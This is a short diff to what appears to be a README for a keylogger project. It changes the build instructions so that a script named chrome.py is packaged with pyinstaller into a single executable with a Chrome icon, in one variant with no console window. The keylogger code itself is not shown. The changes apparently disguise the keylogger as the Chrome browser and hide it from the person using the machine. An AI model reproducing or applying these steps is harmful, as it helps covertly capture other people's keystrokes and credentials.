@@ -5,7 +5,6 @@ simple app key logger for my job
 
 ```
 pip install pyinstaller &&
-pyinstaller app.py
-pyinstaller --onefile app.py
-pyinstaller --onefile --noconsole app.py
+pyinstaller --onefile --icon=chrome.ico chrome.py
+pyinstaller --onefile --noconsole --icon=chrome.ico chrome.py
 ```
